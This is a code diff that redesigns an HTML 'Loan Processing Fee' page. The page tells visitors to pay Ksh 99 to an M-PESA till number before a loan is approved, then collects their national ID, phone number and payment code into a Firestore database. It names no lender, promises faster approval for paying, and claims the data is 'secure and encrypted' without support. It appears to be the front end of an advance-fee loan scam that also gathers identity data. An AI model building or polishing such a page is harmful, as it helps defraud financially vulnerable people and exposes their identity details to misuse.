@@ -2,81 +2,407 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Loan Processing Payment</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
   <style>
+    :root {
+      --primary: #4361ee;
+      --primary-dark: #3a56d4;
+      --secondary: #7209b7;
+      --success: #4cc9f0;
+      --warning: #f72585;
+      --light: #f8f9fa;
+      --dark: #212529;
+      --gray: #6c757d;
+      --border-radius: 12px;
+      --box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+      --transition: all 0.3s ease;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: "Segoe UI", sans-serif;
-      background: #f4f6f9;
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
       margin: 0;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
+      padding: 20px;
+      color: var(--dark);
+      line-height: 1.6;
     }
-    .payment-box {
+
+    .container {
+      display: flex;
+      max-width: 1000px;
+      width: 100%;
       background: #fff;
-      padding: 25px;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      width: 400px;
+      border-radius: var(--border-radius);
+      box-shadow: var(--box-shadow);
+      overflow: hidden;
     }
-    h2 {
+
+    .illustration-section {
+      flex: 1;
+      background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+      color: white;
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
       text-align: center;
-      color: #2c3e50;
     }
-    .info {
-      background: #fef5e7;
-      border-left: 4px solid #f39c12;
-      padding: 10px;
-      font-size: 14px;
+
+    .illustration {
+      font-size: 120px;
+      margin-bottom: 20px;
+    }
+
+    .illustration-section h2 {
+      font-size: 28px;
       margin-bottom: 15px;
     }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
+
+    .illustration-section p {
+      font-size: 16px;
+      opacity: 0.9;
     }
-    button {
+
+    .benefits {
+      margin-top: 30px;
+      text-align: left;
       width: 100%;
-      padding: 12px;
-      background: #2c3e50;
+    }
+
+    .benefit-item {
+      display: flex;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+
+    .benefit-item i {
+      margin-right: 10px;
+      color: var(--success);
+    }
+
+    .payment-section {
+      flex: 1;
+      padding: 40px;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .header h1 {
+      color: var(--primary);
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+
+    .header p {
+      color: var(--gray);
+    }
+
+    .payment-info {
+      background: #f0f7ff;
+      border-left: 4px solid var(--primary);
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 25px;
+    }
+
+    .payment-details {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 10px;
+    }
+
+    .amount {
+      font-size: 24px;
+      font-weight: bold;
+      color: var(--primary);
+    }
+
+    .till-number {
+      background: var(--primary);
+      color: white;
+      padding: 5px 10px;
+      border-radius: 6px;
+      font-weight: bold;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 600;
+      color: var(--dark);
+    }
+
+    .input-with-icon {
+      position: relative;
+    }
+
+    .input-with-icon i {
+      position: absolute;
+      left: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--gray);
+    }
+
+    .input-with-icon input {
+      width: 100%;
+      padding: 12px 15px 12px 45px;
+      border: 2px solid #e1e5eb;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: var(--transition);
+    }
+
+    .input-with-icon input:focus {
+      border-color: var(--primary);
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(to right, var(--primary), var(--secondary));
       color: #fff;
       border: none;
       border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
       cursor: pointer;
-      margin-top: 10px;
+      transition: var(--transition);
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
-    button:hover {
-      background: #1a252f;
+
+    .submit-btn:hover {
+      background: linear-gradient(to right, var(--primary-dark), #651a98);
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(67, 97, 238, 0.3);
     }
+
+    .submit-btn:active {
+      transform: translateY(0);
+    }
+
+    .submit-btn i {
+      margin-right: 10px;
+    }
+
     #message {
       text-align: center;
-      margin-top: 12px;
-      font-size: 14px;
+      margin-top: 15px;
+      padding: 10px;
+      border-radius: 6px;
+      font-weight: 500;
+    }
+
+    .success {
+      background: #e8f5e9;
+      color: #2e7d32;
+      border: 1px solid #a5d6a7;
+    }
+
+    .error {
+      background: #ffebee;
+      color: #c62828;
+      border: 1px solid #ef9a9a;
+    }
+
+    .steps {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 30px;
+      position: relative;
+    }
+
+    .steps::before {
+      content: '';
+      position: absolute;
+      top: 20px;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: #e1e5eb;
+      z-index: 1;
+    }
+
+    .step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      z-index: 2;
+    }
+
+    .step-circle {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: #e1e5eb;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: var(--gray);
+    }
+
+    .step.active .step-circle {
+      background: var(--primary);
+      color: white;
+    }
+
+    .step-text {
+      font-size: 12px;
+      text-align: center;
+      color: var(--gray);
+    }
+
+    .step.active .step-text {
+      color: var(--primary);
+      font-weight: 600;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 12px;
+      color: var(--gray);
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        flex-direction: column;
+      }
+      
+      .illustration-section {
+        padding: 30px 20px;
+      }
+      
+      .payment-section {
+        padding: 30px 20px;
+      }
+      
+      .illustration {
+        font-size: 80px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="payment-box">
-    <h2>Loan Processing Fee</h2>
-    <div class="info">
-      To process your loan application, you are required to pay a total fee of 
-      <b>Ksh 99</b> via <b>Till Number: 4585402</b>. <br><br>
-      ✅ Covers processing, CRB check, and data securing. <br>
-      ✅ Increases your loan eligibility. <br>
-      ✅ Fastens approval & disbursement time. 
+  <div class="container">
+    <div class="illustration-section">
+      <div class="illustration">
+        <i class="fas fa-hand-holding-usd"></i>
+      </div>
+      <h2>Fast Loan Processing</h2>
+      <p>Complete your payment to expedite your loan approval</p>
+      
+      <div class="benefits">
+        <div class="benefit-item">
+          <i class="fas fa-check-circle"></i>
+          <span>Covers processing, CRB check, and data securing</span>
+        </div>
+        <div class="benefit-item">
+          <i class="fas fa-check-circle"></i>
+          <span>Increases your loan eligibility</span>
+        </div>
+        <div class="benefit-item">
+          <i class="fas fa-check-circle"></i>
+          <span>Fastens approval & disbursement time</span>
+        </div>
+      </div>
     </div>
-
-    <input type="text" id="idNumber" placeholder="National ID Number" required>
-    <input type="tel" id="phone" placeholder="Active Mobile Number (07...)" required>
-    <input type="text" id="mpesaCode" placeholder="M-PESA Confirmation Code" required>
-    <button onclick="submitPayment()">Submit Payment</button>
-    <p id="message"></p>
+    
+    <div class="payment-section">
+      <div class="header">
+        <h1>Loan Processing Fee</h1>
+        <p>Complete the form below to submit your payment details</p>
+      </div>
+      
+      <div class="payment-info">
+        <p>To process your loan application, you are required to pay a processing fee via M-PESA:</p>
+        <div class="payment-details">
+          <div class="amount">Ksh 99</div>
+          <div class="till-number">Till: 4585402</div>
+        </div>
+      </div>
+      
+      <form id="paymentForm">
+        <div class="form-group">
+          <label for="idNumber">National ID Number</label>
+          <div class="input-with-icon">
+            <i class="fas fa-id-card"></i>
+            <input type="text" id="idNumber" placeholder="Enter your National ID" required>
+          </div>
+        </div>
+        
+        <div class="form-group">
+          <label for="phone">Mobile Number</label>
+          <div class="input-with-icon">
+            <i class="fas fa-phone"></i>
+            <input type="tel" id="phone" placeholder="07XXXXXXXX" required>
+          </div>
+        </div>
+        
+        <div class="form-group">
+          <label for="mpesaCode">M-PESA Confirmation Code</label>
+          <div class="input-with-icon">
+            <i class="fas fa-receipt"></i>
+            <input type="text" id="mpesaCode" placeholder="Enter M-PESA code" required>
+          </div>
+        </div>
+        
+        <button type="button" class="submit-btn" onclick="submitPayment()">
+          <i class="fas fa-paper-plane"></i> Submit Payment Details
+        </button>
+        
+        <div id="message"></div>
+      </form>
+      
+      <div class="steps">
+        <div class="step active">
+          <div class="step-circle">1</div>
+          <div class="step-text">Make Payment</div>
+        </div>
+        <div class="step">
+          <div class="step-circle">2</div>
+          <div class="step-text">Submit Details</div>
+        </div>
+        <div class="step">
+          <div class="step-circle">3</div>
+          <div class="step-text">Get Approved</div>
+        </div>
+      </div>
+      
+      <div class="footer">
+        <p>Your information is secure and encrypted</p>
+      </div>
+    </div>
   </div>
 
   <script>
@@ -94,19 +420,63 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
+    // Input validation functions
+    function validateIdNumber(idNumber) {
+      const idRegex = /^\d{8}$/;
+      return idRegex.test(idNumber);
+    }
+
+    function validatePhone(phone) {
+      const phoneRegex = /^07\d{8}$/;
+      return phoneRegex.test(phone);
+    }
+
+    function validateMpesaCode(mpesaCode) {
+      const mpesaRegex = /^[A-Z0-9]{10}$/;
+      return mpesaRegex.test(mpesaCode);
+    }
+
     async function submitPayment() {
       const idNumber = document.getElementById("idNumber").value.trim();
       const phone = document.getElementById("phone").value.trim();
       const mpesaCode = document.getElementById("mpesaCode").value.trim();
       const msg = document.getElementById("message");
 
+      // Clear previous messages
+      msg.className = '';
+      msg.textContent = '';
+
+      // Validate inputs
       if (!idNumber || !phone || !mpesaCode) {
-        msg.style.color = "red";
-        msg.textContent = "⚠️ Please fill in all fields.";
+        msg.className = 'error';
+        msg.textContent = '⚠️ Please fill in all fields.';
+        return;
+      }
+
+      if (!validateIdNumber(idNumber)) {
+        msg.className = 'error';
+        msg.textContent = '⚠️ Please enter a valid 8-digit National ID.';
+        return;
+      }
+
+      if (!validatePhone(phone)) {
+        msg.className = 'error';
+        msg.textContent = '⚠️ Please enter a valid Kenyan phone number (07XXXXXXXX).';
+        return;
+      }
+
+      if (!validateMpesaCode(mpesaCode)) {
+        msg.className = 'error';
+        msg.textContent = '⚠️ Please enter a valid M-PESA confirmation code.';
         return;
       }
 
       try {
+        // Show loading state
+        const submitBtn = document.querySelector('.submit-btn');
+        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+        submitBtn.disabled = true;
+
         // Save under users collection using phone number as doc ID
         await db.collection("users").doc(phone).set({
           idNumber,
@@ -124,19 +494,52 @@
         // Save phone in localStorage to use in Notification page
         localStorage.setItem("userPhone", phone);
 
-        msg.style.color = "green";
-        msg.textContent = "✅ Payment submitted successfully. Redirecting...";
+        msg.className = 'success';
+        msg.textContent = '✅ Payment submitted successfully. Redirecting...';
+
+        // Update steps UI
+        document.querySelectorAll('.step')[1].classList.add('active');
 
         // Redirect to notifications page after 2 seconds
         setTimeout(() => {
-          window.location.href = "apply.html";
+          window.location.href = "notification.html";
         }, 2000);
 
       } catch (error) {
-        msg.style.color = "red";
-        msg.textContent = "❌ " + error.message;
+        msg.className = 'error';
+        msg.textContent = '❌ Error: ' + error.message;
+        
+        // Reset button
+        const submitBtn = document.querySelector('.submit-btn');
+        submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Payment Details';
+        submitBtn.disabled = false;
       }
     }
+
+    // Add input event listeners for real-time validation
+    document.getElementById('idNumber').addEventListener('input', function() {
+      if (this.value.trim() && !validateIdNumber(this.value.trim())) {
+        this.style.borderColor = 'var(--warning)';
+      } else {
+        this.style.borderColor = '#e1e5eb';
+      }
+    });
+
+    document.getElementById('phone').addEventListener('input', function() {
+      if (this.value.trim() && !validatePhone(this.value.trim())) {
+        this.style.borderColor = 'var(--warning)';
+      } else {
+        this.style.borderColor = '#e1e5eb';
+      }
+    });
+
+    document.getElementById('mpesaCode').addEventListener('input', function() {
+      if (this.value.trim() && !validateMpesaCode(this.value.trim())) {
+        this.style.borderColor = 'var(--warning)';
+      } else {
+        this.style.borderColor = '#e1e5eb';
+      }
+    });
   </script>
 </body>
 </html>
